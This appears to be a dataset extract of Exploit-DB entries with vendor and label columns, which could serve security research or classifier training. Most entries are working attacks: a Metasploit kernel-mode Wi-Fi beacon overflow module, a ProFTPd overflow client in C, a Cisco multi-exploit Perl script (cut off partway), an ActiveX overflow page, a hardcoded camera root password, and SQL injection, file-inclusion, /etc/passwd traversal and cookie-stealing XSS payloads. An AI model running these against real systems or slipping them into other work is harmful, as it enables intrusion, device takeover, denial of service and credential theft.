#",lawyer_search_script_project,1
4613,"Adobe Shockwave - 'ShockwaveVersion()' Stack Overflow (PoC) <html>  <head>   <script language=""JavaScript"" DEFER>     function Check() {      var s = ""AAAA"";      while (s.length < 768 * 768) s=s+s;         var obj = new ActiveXObject(""SWCtl.SWCtl""); //{233C1507-6A77-46A4-9443-F871F945D258}            obj.ShockwaveVersion(s);     }   </script>   </head>    <body onload=""JavaScript: return Check();"" /> </html>  # milw0rm.com [2007-11-08]",Adobe,1
43693,"Master IP CAM 01 - Multiple Vulnerabilities # Exploit Title: Master IP CAM 01 Multiple Vulnerabilities # Date: 17-01-2018 # Remote: Yes # Exploit Authors: Daniele Linguaglossa, Raffaele Sabato # Contact: https://twitter.com/dzonerzy, https://twitter.com/syrion89 # Vendor: Master IP CAM # Version: 3.3.4.2103 # CVE: CVE-2018-5723, CVE-2018-5724, CVE-2018-5725, CVE-2018-5726  I DESCRIPTION ======================================================================== The Master IP CAM 01 suffers of multiple vulnerabilities:  # [CVE-2018-5723] Hardcoded Password for Root Account # [CVE-2018-5724] Unauthenticated Configuration Download and Upload # [CVE-2018-5725] Unauthenticated Configuration Change # [CVE-2018-5726] Unauthenticated Sensitive Information Disclousure   II PROOF OF CONCEPT ========================================================================  ## [CVE-2018-5723] Hardcoded Password for Root Account  Is possible to access telnet with the hardcoded credential root:cat1029   ## [CVE-2018-5724] Unauthenticated Configuration Download and Upload  Download:  http://192.168.1.15/web/cgi-bin/hi3510/backup.cgi  Upload Form:  ### Unauthenticated Configuration Upload <form name=""form6"" method=""post"" enctype=""multipart/form-data"" action=""cgi-bin/hi3510/restore.cgi"" > <input type=""file"" name=""setting_file"" > <input type=""submit"" value=""restore"" > </form>   ## [CVE-2018-5725] Unauthenticated Configuration Change  Change configuration:  http://192.168.1.15/web/cgi-bin/hi3510/param.cgi?cmd=sethttpport&-httport=8080  List of available commands here: http://www.themadhermit.net/wp-content/uploads/2013/03/FI9821W-CGI-Commands.pdf   ## [CVE-2018-5726] Unauthenticated Sensitive Information Disclousure  Retrieve sensitive information:  http://192.168.1.15/web/cgi-bin/hi3510/param.cgi?cmd=getuser   III REFERENCES ======================================================================== http://syrion.me/blog/master-ipcam/ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5723 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5724 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5725 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5726 http://www.themadhermit.net/wp-content/uploads/2013/03/FI9821W-CGI-Commands.pdf",.themadhermit.,1
6224,"txtSQL 2.2 Final - 'startup.php' Remote File Inclusion ??????????????????????????????????????????????????????????????????????????????? ??                             C r a C k E r                                ?? ??          T H E   C R A C K   O F   E T E R N A L   M I G H T             ?? ??????????????????????????????????????????????????????????????????????????????   ?????      From The Ashes and Dust Rises An Unimaginable crack....      ????? ?????????????????????????????????????????????????????????????????????????????? ??                          [ Remote File Include ]                         ?? ?????????????????????????????????????????????????????????????????????????????? :   Author   : CraCkEr                : :                                    : ?   Group    : N/A                    ? ?                                    ? ?   Script   : txtSQL 2.2 Final       ? ?         Register Globals :         ? ?   Download : sourceforge.net        ? ?                                    ? ?   Method   : GET                    ? ?          [?] ON   [ ] OFF          ? ?   Critical : High [????????]        ? ?                                    ? ?   Impact   : System access          ? ?                                    ? ? ????????????????????????????????????? ???????????????????????????????????? ? ?                              DALnet #crackers                             ?? ?????????????????????????????????????????????????????????????????????????????? :                                                                            : ?  Release Notes:                                                            ? ?  ?????????????                                                             ? ?  Typically used for remotely exploitable vulnerabilities that can lead to  ? ?  system compromise.                                                        ? ?                                                                            ?  ?????????????????????????????????????????????????????????????????????????????? ??                             Exploit URL's                                ?? ??????????????????????????????????????????????????????????????????????????????  [RFI]    http://localhost/path/examples/txtSQLAdmin/startup.php?CFG[txtsql][class]=[SHELL]      ??????????????????????????????????????????????????????????????????????????????   Greets:        The_PitBull, Raz0r, iNs, Sad, His0k4, Hussin X, Mr. SQL .  ?????????????????????????????????????????????????????????????????????????????? ??                              © CraCkEr 2008                              ?? ??????????????????????????????????????????????????????????????????????????????  # milw0rm.com [2008-08-10]",txtSQL,1
9037,"Clicknet CMS 2.1 - 'side' Arbitrary File Disclosure ################################################################################################################# [+] Clicknet CMS v2.1(side) File Disclosure Vulnerability [+] Discovered By ThE g0bL!N [+] Vendor:http://cms.clicknet.dk [+} Download:http://cms.clicknet.dk/download/index.php?test=2 [+] Dork:""Powered by Clicknet CMS"" [+] Note: All Site Danemark So Fuck It please :) [+] Greets : R3d-D3v!L ################################################################################################################# Exploit: ------- Exploit --- http://127.0.0.1/index.php?side=../index [ out of .php ] Then View Source To Get A good View Demo ---- http://www.t68.clicknet.dk/index.php?side=../index ################################################################################################################  # milw0rm.com [2009-06-29]",Clicknet,1
16388,"Netgear WG111v2 Wireless Driver - Long Beacon Overflow (Metasploit) ## # $Id: netgear_wg111_beacon.rb 9669 2010-07-03 03:13:45Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = LowRanking  	include Msf::Exploit::Lorcon2 	include Msf::Exploit::KernelMode  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'NetGear WG111v2 Wireless Driver Long Beacon Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in the NetGear WG111v2 wireless 				device driver. This stack buffer overflow allows remote code execution in kernel mode. 				The stack buffer overflow is triggered when a 802.11 Beacon frame is received that 				contains more than 1100 bytes worth of information elements.  				This exploit was tested with version 5.1213.6.316 of the WG111v2.SYS driver and 				a NetGear WG111v2 USB adapter. Since this vulnerability is exploited via beacon frames, 				all cards within range of the attack will be affected. The tested adapter used 				a MAC address in the range of 00:18:4d:02:XX:XX.  				Vulnerable clients will need to have their card in a non-associated state 				for this exploit to work. The easiest way to reproduce this bug is by starting 				the exploit and then unplugging and reinserting the USB card. The exploit can 				take up to a minute to execute the payload, depending on system activity.  				NetGear was NOT contacted about this flaw. A search of the SecurityFocus 				database indicates that NetGear has not provided an official patch or 				solution for any of the thirty flaws listed at the time of writing. This list 				includes BIDs: 1010, 3876, 4024, 4111, 5036, 5667, 5830, 5943, 5940, 6807, 7267, 7270, 				7371, 7367, 9194, 10404, 10459, 10585, 10935, 11580, 11634, 12447, 15816, 16837, 				16835, 19468, and 19973.  				This module depends on the Lorcon2 library and only works on the Linux platform 				with a supported wireless card. Please see the Ruby Lorcon2 documentation 				(external/ruby-lorcon/README) for more information. 			}, 			'Author'         => [ 'hdm' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9669 $', 			'References'     => 				[ 					['CVE', '2006-5972'], 					['OSVDB', '30473'], 					['URL', 'http://projects.info-pull.com/mokb/MOKB-16-11-2006.html'], 				], 			'Privileged'     => true,  			'DefaultOptions' => 				{ 					'EXITFUNC' => 'thread', 				}, 			'Payload'        => 				{ 					# Its a beautiful day in the neighborhood... 					'Space'  => 1000, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					# Windows XP SP2 with the latest updates 					# 5.1.2600.2622 (xpsp_sp2_gdr.050301-1519) 					[ 'Windows XP SP2 (5.1.2600.2122), WG111v2.SYS 5.1213.6.316', 						{ 							'Ret'      => 0x80502d7f, # jmp esp 							'Platform' => 'win', 							'Payload'  => 							{ 								'ExtendedOptions' => 								{ 									'Stager'       => 'sud_syscall_hook', 									'PrependUser'  => ""\x81\xC4\x54\xF2\xFF\xFF"", # add esp, -3500 									'Recovery'     => 'idlethread_restart', 									'KiIdleLoopAddress' => 0x804dbb27, 								} 							} 						} 					],  					# Windows XP SP2 install media, no patches 					# 5.1.2600.2180 (xpsp_sp2_rtm_040803-2158) 					[ 'Windows XP SP2 (5.1.2600.2180), WG111v2.SYS 5.1213.6.316', 						{ 							'Ret'      => 0x804ed5cb, # jmp esp 							'Platform' => 'win', 							'Payload'  => 							{ 								'ExtendedOptions' => 								{ 									'Stager'       => 'sud_syscall_hook', 									'PrependUser'  => ""\x81\xC4\x54\xF2\xFF\xFF"", # add esp, -3500 									'Recovery'     => 'idlethread_restart', 									'KiIdleLoopAddress' => 0x804dc0c7, 								} 							} 						} 					] 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Nov 16 2006'))  		register_options( 			[ 				OptString.new('ADDR_DST', [ true,  ""The MAC address to send this to"",'FF:FF:FF:FF:FF:FF']), 				OptInt.new('RUNTIME', [ true,  ""The number of seconds to run the attack"", 60]) 			], self.class) 	end  	def exploit 		open_wifi  		stime = Time.now.to_i 		rtime = datastore['RUNTIME'].to_i 		count = 0  		print_status(""Sending exploit beacons for #{datastore['RUNTIME']} seconds..."") 		while (stime + rtime > Time.now.to_i) 			wifi.write(create_beacon) 			select(nil, nil, nil, 0.10) if (count % 100 == 0)  			count += 1  			# Exit if we get a session 			break if session_created? 		end  		print_status(""Completed sending beacons."") 	end  	# Convert arbitrary data into a series of information elements 	def ie_padding(data) 		ret = 0 		idx = 0 		len = 0  		while(idx < data.length) 			len = data[idx+1] 			if (! len) 				data << ""\x00"" 				len = 0 			end  			idx += len + 2 		end  		data << yield(idx - data.length) 	end  	def create_beacon  		ssid   = rand_text_alphanumeric(16) 		bssid  = (""\x00"" * 2) + rand_text(4) 		src    = (""\x00"" * 2) + rand_text(4) 		seq    = [rand(255)].pack('n') 		stamp  = rand_text(8)  		frame = 			""\x80"" +                      # type/subtype 			""\x00"" +                      # flags 			""\x00\x00"" +                  # duration 			eton(datastore['ADDR_DST']) + # dst 			src +                         # src 			bssid +                       # bssid 			seq   +                       # seq 			stamp +                       # timestamp value 			""\x64\x00"" +                  # beacon interval 			rand_text(2) +      # capability flags  			# ssid tag 			""\x00"" + ssid.length.chr + ssid +  			# supported rates 			""\x01"" + ""\x08"" + ""\x82\x84\x8b\x96\x0c\x18\x30\x48"" +  			# current channel 			""\x03"" + ""\x01"" + channel.chr  		# Bounce through EDI to the uncorrupted payload 		jumper = 			""\x6a\x39"" + # push byte +0x39 			""\x58""     + # pop eax 			""\x01\xc7"" + # add edi, eax 			""\xff\xe7""   # jmp edi  		# Overwrite enough to pop the return 		buf = rand_text(1160)  		# Kernel-mode stager fun goes here 		buf[0, payload.encoded.length] = payload.encoded  		# Return address is a jmp ESP 		buf[1101, 4] = [ target.ret ].pack('V')  		# Jump back to EDI + 0x39 		buf[1113, jumper.length] = jumper  		# Pad it out to be a valid set of IEs 		frame << ie_padding(buf) {|c| rand_text(c) }  		return frame 	end  end",NetGear,1
34916,IBM Tivoli Access Manager for E-Business - '/ibm/wpm/user?method' Cross-Site Scripting source: https://www.securityfocus.com/bid/44382/info           IBM Tivoli Access Manager for e-business is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.           An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.           IBM Tivoli Access Manager for e-business 6.1.0 is vulnerable  http://www.example.com/ibm/wpm/user?method=props%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E,IBM,1
41387,"Joomla! Component EShop 2.5.1 - 'id' SQL Injection # # # # #  # Exploit Title: Joomla! Component EShop v2.5.1 - SQL Injection # Google Dork: inurl:index.php?option=com_eshop # Date: 18.02.2017 # Vendor Homepage: https://www.joomdonation.com/ # Software Buy: https://www.joomdonation.com/joomla-extensions/eshop-joomla-shopping-cart.html # Demo: http://joomdonationdemo.com/eshop # Version: 2.5.1 # Tested on: Win7 x64, Kali Linux x64 # # # # #  # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[@]ihsan[.]net # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/index.php?option=com_eshop&view=category&id=[SQL] # # # # #",.joomdonation.,1
26021,Asn Guestbook 1.5 - 'footer.php?version' Cross-Site Scripting source: https://www.securityfocus.com/bid/14356/info   Asn Guestbook is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/footer.php?version=<script>alert(document.cookie)</script>,Asn,1
47115,"Microsoft Windows 10.0.17134.648 - HTTP -> SMB NTLM Reflection Leads to Privilege Elevation VULNERABILITY DETAILS It's possible to use the NTLM reflection attack to escape a browser sandbox in the case where the sandboxed process is allowed to create TCP sockets. In particular, I was able to combine the issues mentioned below with a bug in Chromium to escape its sandbox.  ## HTTP -> SMB NTLM reflection This is a long known attack that was described, for example, in https://bugs.chromium.org/p/project-zero/issues/detail?id=222. As far as I can tell, MS16-075 was supposed to to fix it by blocking attempts to reflect NTLM authentication operating in the same machine mode (not sure about the actual internal term for that). However, it's still possible to reflect NTLM authentication that works in the regular remote mode, and an attacker can force the parties to use the remote mode, for example, by clearing the NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED flag in the initial NEGOTIATE_MESSAGE message.  In the actual exploit, a compromised sandboxed process acts as both a web server and an SMB client, and asks the browser to visit http://localhost:[fake_webserver_port]. The browser receives an NTLM authentication request and considers the `localhost` domain to be safe to automatically log on with the current user's credentials. The sandboxed process forwards the corresponding packets to the local SMB server.  The problem here is that since the established session is considered remotely authenticated, it's not allowed to access administrative shares unless the browser process runs at the high integrity level. Therefore, another bug is required to gain file system access.  ## Insufficient path check in EFSRPC The Encrypting File System Remote Protocol is a Remote Procedure Call interface that is used to manage data objects stored in an encrypted form. It supports backing up and restoring files over SMB, among other things. Functions like `EfsRpcOpenFileRaw` implement security checks, i.e., they forbid remote users to pass regular file paths. However, if the attacker passes a UNC path of the form `\\localhost\C$\...`, `lsass.exe` will initiate a new SMB connection while impersonating the calling user, but this time using the same machine mode authentication; therefore it will be permitted to access the C$ share.  The exploit saves the payload on the user's disk (the easiest way might be just to force it to be auto-downloaded as a .txt file) and calls the EFSRPC methods to copy it as an .exe file to the user's Startup folder.  There's also another path check bypass that has been found by James Forshaw. `EfsRpcOpenFileRaw` accepts file paths starting with `\\.\C:\...`, presumably thinking that it's a UNC path since it starts with two back-slashes. Please note that this variant also works in the case where a regular user's credentials are relayed to another machine in a domain, so it might have wider security implications.  It's also worth mentioning that the `efsrpc` named pipe might not be enabled by default, but the same RPC endpoint is available on the `lsass` named pipe with UUID [c681d488-d850-11d0-8c52-00c04fd90f7e].  REPRODUCTION CASE The proof-of-concept is based on [impacket](https://github.com/SecureAuthCorp/impacket/). It's a collection of Python classes that supports working with SMB and MSRPC. 1. Run `start.cmd`, which downloads impacket from Github, applies the patch, and starts the server. 2. Open http://localhost/ in a Chromium-based browser. 3. You should see a new .exe file appearing on your desktop.  VERSION Microsoft Windows [Version 10.0.17134.648]  REFERENCES https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b38c36ed-2804-4868-a9ff-8dd3182128e4 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47115.zip",Microsoft,1
23170,"ProFTPd 1.2.7/1.2.8 - '.ASCII' File Transfer Buffer Overrun // source: https://www.securityfocus.com/bid/8679/info  A remotely exploitable buffer overrun vulnerability has been reported in ProFTPD. This issue could be triggered if an attacker uploads a malformed file and then that file is downloaded in ASCII mode. Successful exploitation will permit a malicious FTP user with upload access to execute arbitrary code in the context of the FTP server.  It is also reported that ProFTPD does not adequately drop privileges in some circumstances, which may compound the risks associated with exploitation.  This issue could also affect versions prior to 1.2.7, though this has not been confirmed.   /* *  -- ProFTPd [1.2.7-1.2.8] proof-of-concept -- *   *  This code is quite ugly, don't have time cleaning it; *    *  description: iss gave a lil hint to me, so i found the vuln *  in src/data.c file, xlate_ascii_write()  function *  when the iss advisory came out. *   *  -netris at ok.kz * */  #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <arpa/inet.h>  int s1,s2; struct sockaddr_in a1,a2; char *senddata(int sock,char *data, int resp); void data_connect(char *addr,char *pasv, int bool); int data_port(char *pret, char *addr);  int main(int argc, char *argv[]) { 	char *ret; 	char buf[100]; 	 	if(argc!=4){ 		fprintf(stderr,""usage: %s login pass ip_addr\n"",argv[0]); 		exit(0); 	} 	 	a1.sin_family = AF_INET; 	a1.sin_port = htons(21); 	a1.sin_addr.s_addr = inet_addr(argv[3]); 	 	s1 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 	connect(s1,(struct sockaddr*)&a1,sizeof(a1)); 	 	senddata(s1,0,1); 	sprintf(buf,""USER %s\n"",argv[1]); 	senddata(s1,buf,2); 	sprintf(buf,""PASS %s\n"",argv[2]); 	senddata(s1,buf,2); 	senddata(s1,""TYPE A\n"",2); 	 	ret = senddata(s1,""PASV\n"",2); /*STOR*/ 	data_connect(argv[3],ret,0); 	ret = senddata(s1,""PASV\n"",2); /*RETR*/ 	data_connect(argv[3],ret,1); 	ret = senddata(s1,""PASV\n"",2); /*RETR (needed sometimes)*/ 	data_connect(argv[3],ret,1);  	close(s1); 	close(s2); 	return 0; }  char *senddata(int sock,char *data, int resp)  { 	char buf[66000]; 	int i; 	if(resp>=2){  		send(sock,data,strlen(data),0); 		if(strlen(data)<512) 			printf(""%s\n"",data);  	} 	if(resp<=2){   		i=recv(sock,buf,sizeof(buf),0); 		buf[i]=0; 		if(strlen(buf)<512) 			printf(""%s"",buf); 	}  	return buf; }  int data_port(char *pasv, char *addr) { 	int i=0,j,p1,p2,h1=1; 	p1=p2=0; 	for(j=0;j<4;j++) 		for(i+=1;pasv[i]!=',';i++); 	for(i+=1;pasv[i]!=',';i++) 		p1=p1*10+pasv[i]-'0'; 	for(i+=1;pasv[i]!=')';i++) 		p2=p2*10+pasv[i]-'0'; 	h1 += inet_addr(addr) & 0x000000ff; 	j = p1*h1*2+p2; 	printf(""Data port: %d\n"",j); 	return j; }  void data_connect(char *addr, char *pasv, int bool) { 	int port,i;	 	static char buf[65559]; 	close(s2); 	port = data_port(pasv,addr); 	a2.sin_port = htons(port); 	a2.sin_family = AF_INET; 	a2.sin_addr.s_addr = inet_addr(addr); 	s2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 	connect(s2,(struct sockaddr*)&a2,sizeof(a2)); 	if(!bool){ 		senddata(s1,""STOR kf\n"",2); 		for(i=0;i<65558;i++)buf[i]=0x0a; 		buf[i]=0; 		senddata(s2,buf,3); 		close(s2); 	} 	else{ 		senddata(s1,""RETR kf\n"",2); 		senddata(s2,""\n"",2); 	} 	senddata(s1,""\n"",2); }",proftpd,1
26781,"Scout Portal Toolkit 1.3.1 - 'SPT-BrowseResources.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/15818/info   Scout Portal Toolkit is prone to multiple input-validation vulnerabilities because the application fails to properly sanitize user-supplied input.   A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database. Other attacks are also possible.  http://www.example.com/Projects/SPT/demo/SPT--BrowseResources.php?ParentId=<script>alert(document.cookie)</script>",Scout,1
1934,dotProject 2.0.3 - 'baseDir' Remote File Inclusion Credits : h4ntu Title : dotProject <= 2.0.3 Remote File Inclusion URL : http://www.dotproject.net/ Exploit : http://target.com/[dotProject_path]/includes/db_adodb.php?baseDir=[attacker]   # milw0rm.com [2006-06-20],dotproject,1
14247,"Auction_Software Script - Admin Authentication Bypass 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1  Name :  Auction_Software Script Admin Login Bypass vulnerability vendor URL :http://www.brotherscripts.com/ Price:  $24.95 Author : altbta <l_9[at]hotmail.com> dork : ""PHPAuction GPL Enhanced V2.51 by AuctionCode.com""  1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1  Xploit : Auth Bypass Demo : http://www.site.com/demos/Auction_Software/admin/  UserName: ' or 1=1 or ''='  Password: ' or 1=1 or ''='   1-=-=-=-=-=-=-=-=-=-=-=-=-=-= (altbta) =-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1 greetz to : RoMaNcYxHaCkEr & sad hacker & ab0-3th4b & Mr.SaFa7 & Mn7oS & V ! V 3 Evil-Cod3r & asL-Sabia & ! Dr.www ! & MaKKaWi & ZaIdOoHxHaCkEr & al.bito SnIpEr.SiTeS & R3d-D3v!L & MN9  xp10.me/xp10 & v4-team.com/cc",.brotherscripts.,1
29641,XT:Commerce 3.04 - 'index.php' Local File Inclusion source: https://www.securityfocus.com/bid/22698/info  xt:Commerce is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  Exploiting this issue may allow an unauthorized user to view files and execute local scripts.  xt:Commerce 3.04 and prior versions are vulnerable to this issue.   http://www.example.com/index.php?currency=EUR&manufacturers_id=1&template=../../../../../../../../etc/passwd%00,xt:,1
1884,"myNewsletter 1.1.2 - 'adminLogin.asp' Authentication Bypass <!-- orginal advisory : http://www.kapda.ir/advisory-340.html --> <html><center><h4>KAPDA.ir --- myNewsletter <= 1.1.2 Login bypass exploit</h4><br>change action in source and then submit </center><form name=""adminLogin"" method=""post"" action=""http://site/newsletter/adminLogin.asp""> <input type=""hidden"" name=""UserName"" value=""<!--'union select 1 from Newsletter_Admin where ''='""> <input type=""hidden"" name=""Password"" value=""1""> <center><br><input type=""submit"" name=""Submit"" value=""Login""></center><br><br> <!-- Discovered and coded by FarhadKey / email : farhadkey [aT} kapda {D0T} net --> <center><a href=""http://www.kapda.ir"">www.kapda.ir</a></center> </form> </html>  # milw0rm.com [2006-06-06]",.kapda.iradvisory-340.html,0
20473,"Cisco Catalyst 4000 4.x/5.x / Catalyst 5000 4.5/5.x / Catalyst 6000 5.x - Memory Leak Denial of Service source: https://www.securityfocus.com/bid/2072/info  Cisco Catalyst is a high speed switch implemented in local area networks.  The telnet server that is built into the Catalyst firmware for remote administration contains a memory leak vulnerability that can result in a denial of service. Each time that the telnet service started, memory resources are used without being freed afterwards. As a result, memory can be depleted by connecting multiple clients to the Catalyst telnet server leaving the device unable to function properly.  This can lead to a denial of service of network services dependent on the Catalyst until the device is manually reset.   #!/usr/bin/perl  ## # Cisco Global Exploiter # # Legal notes : # The BlackAngels staff refuse all responsabilities # for an incorrect or illegal use of this software # or for eventual damages to others systems. # # http://www.blackangels.it ##    ## # Modules ##  use Socket; use IO::Socket;   ## # Main ##  $host = """"; $expvuln = """"; $host = @ARGV[ 0 ]; $expvuln = @ARGV[ 1 ];  if ($host eq """") { usage(); } if ($expvuln eq """") { usage(); } if ($expvuln eq ""1"") { cisco1(); } elsif ($expvuln eq ""2"") { cisco2(); } elsif ($expvuln eq ""3"") { cisco3(); } elsif ($expvuln eq ""4"") { cisco4(); } elsif ($expvuln eq ""5"") { cisco5(); } elsif ($expvuln eq ""6"") { cisco6(); } elsif ($expvuln eq ""7"") { cisco7(); } elsif ($expvuln eq ""8"") { cisco8(); } elsif ($expvuln eq ""9"") { cisco9(); } elsif ($expvuln eq ""10"") { cisco10(); } elsif ($expvuln eq ""11"") { cisco11(); } elsif ($expvuln eq ""12"") { cisco12(); } elsif ($expvuln eq ""13"") { cisco13(); } elsif ($expvuln eq ""14"") { cisco14(); } else { printf ""\nInvalid vulnerability number ...\n\n""; exit(1); }   ## # Functions ##  sub usage {   printf ""\nUsage :\n"";   printf ""perl cge.pl <target> <vulnerability number>\n\n"";   printf ""Vulnerabilities list :\n"";   printf ""[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability\n"";   printf ""[2] - Cisco IOS Router Denial of Service Vulnerability\n"";   printf ""[3] - Cisco IOS HTTP Auth Vulnerability\n"";   printf ""[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability\n"";   printf ""[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability\n"";   printf ""[6] - Cisco 675 Web Administration Denial of Service Vulnerability\n"";   printf ""[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability\n"";   printf ""[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability\n"";   printf ""[9] - Cisco 514 UDP Flood Denial of Service Vulnerability\n"";   printf ""[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability\n"";   printf ""[11] - Cisco Catalyst Memory Leak Vulnerability\n"";   printf ""[12] - Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability\n"";   printf ""[13] - %u Encoding IDS Bypass Vulnerability (UTF)\n"";   printf ""[14] - Cisco IOS HTTP Denial of Service Vulnerability\n"";   exit(1); }  sub cisco1 # Cisco 677/678 Telnet Buffer Overflow Vulnerability {   my $serv = $host;   my $dch = ""?????????????????a~ %%%%%XX%%%%%"";   my $num = 30000;   my $string .= $dch x $num;   my $shc=""\015\012"";    my $sockd = IO::Socket::INET->new (                                      Proto => ""tcp"",                                      PeerAddr => $serv,                                      PeerPort => ""(23)"",                                      ) || die(""No telnet server detected on $serv ...\n\n"");    $sockd->autoflush(1);   print $sockd ""$string"". $shc;   while (<$sockd>){ print }   print(""\nPacket sent ...\n"");   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto => ""tcp"",                                       PeerAddr => $serv,                                       PeerPort => ""(23)"",                                       ) || die(""Vulnerability successful exploited. Target server is down ...\n\n"");    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   close($sockd2);   exit(1); }  sub cisco2 # Cisco IOS Router Denial of Service Vulnerability {   my $serv = $host;    my $sockd = IO::Socket::INET->new (                                      Proto=>""tcp"",                                      PeerAddr=>$serv,                                      PeerPort=>""http(80)"",);                                      unless ($sockd){die ""No http server detected on $serv ...\n\n""};   $sockd->autoflush(1);   print $sockd ""GET /\%\% HTTP/1.0\n\n"";   -close $sockd;   print ""Packet sent ...\n"";   sleep(1);   print(""Now checking server's status ...\n"");   sleep(2);    my $sockd2 = IO::Socket::INET->new (                                       Proto=>""tcp"",                                       PeerAddr=>$serv,                                       PeerPort=>""http(80)"",);                                       unless ($sockd2){die ""Vulnerability successful exploited. Target server is down ...\n\n""};    print(""Vulnerability unsuccessful exploited. Target server is still up ...\n\n"");   close($sockd2);   exit(1); }  sub cisco3 # Cisco IOS HTTP Auth Vulnerability {   my $serv= $host;   my $n=16;   my $port=80;   my $target = inet_aton($serv);   my $fg = 0;    LAB: while ($n<100) {   my @results=exploit(""GET /level/"".$n.""/exec/- HTTP/1.0\r\n\r\n"");   $n++;   foreach $line (@results){           $line=~ tr/A-Z/a-z/;           if ($line =~ /http\/1\.0 401 unauthorized/) {$fg=1;}           if ($line =~ /http\/1\.0 200 ok/) {$fg=0;}   }    if ($fg==1) {                sleep(2);                print ""Vulnerability unsuccessful exploited ...\n\n"";               }   else {         sleep(2);         print ""\nVulnerability successful exploited with [http://$serv/level/$n/exec/....] ...\n\n"";         last LAB;        }    sub exploit {                my ($pstr)=@_;                socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||                die(""Unable to initialize socket ...\n\n"");                if(connect(S,pack ""SnA4x8"",2,$port,$target)){                                                             my @in;                                                             select(S);                                                             $|=1;                                                             print $pstr;                                                             while(<S>){ push @in, $_;}                                                             select(STDOUT); close(S); return @in;                                                            }   else { die(""No http server detected on $serv ...\n\n""); }   }   }   exit(1); }  sub cisco4 # Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability {   my $serv = $host;   my $n = 16;    while ($n <100) {                    exploit1(""GET /level/$n/exec/- HTTP/1.0\n\n"");                    $wr =~ s/\n//g;                    if ($wr =~ /200 ok/) {                                               while(1)                                               { print ""\nVulnerability could be successful exploited. Please choose a type of attack :\n"";                                                 print ""[1] Banner change\n"";                                                 print ""[2] List vty 0 4 acl info\n"";                                                 print ""[3] Other\n"";                                                 print ""Enter a valid option [ 1 - 2 - 3 ] : "";                                                 $vuln = <STDIN>;                                                 chomp($vuln);                     if ($vuln == 1) {                                     print ""\nEnter deface line : "";                                     $vuln = <STDIN>;                                     chomp($vuln);                                     exploit1(""GET /level/$n/exec/-/configure/-/banner/motd/$vuln HTTP/1.0\n\n"");                                    }                    elsif ($vuln == 2) {                                        exploit1(""GET /level/$n/exec/show%20conf HTTP/1.0\n\n"");                                        print ""$wrf"";                                       }                    elsif ($vuln == 3)                                       { print ""\nEnter attack URL : "";                                         $vuln = <STDIN>;                                         chomp($vuln);                                         exploit1(""GET /$vuln HTTP/1.0\n\n"");                                         print ""$wrf"";                                       }          }          }          $wr = """";          $n++;   }   die ""Vulnerability unsuccessful exploited ...\n\n"";    sub exploit1 {                 my $sockd = IO::Socket::INET -> new (                                                      Proto => 'tcp',                                                      PeerAddr => $serv,                                                      PeerPort => 80,                                                      Type => SOCK_STREAM,                                                      Timeout => 5);                                                      unless($sockd){die ""No http server detected on $serv ...\n\n""}   $sockd->autoflush(1);   $sockd -> send($_[0]);   while(<$sockd>){$wr .= $_} $wrf = $wr;   close $sockd;   }   exit(1); }  sub cisco5 # Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability {   my $serv = $host;   my $port = 22;   my $vuln = ""a%a%a%a%a%a%a%"";     my $sockd = IO::Socket::INET->new (                                      PeerAddr => $serv,                                      PeerPort => $port,                                      Proto => ""tcp"")                                      || die ""No ssh server detected on $serv ...\n\n"";    print ""Packet sent ...\n"";   print $sockd ""$vuln"";   close($sockd);   exit(1); }  sub cisco6 # Cisco 675 Web Administration 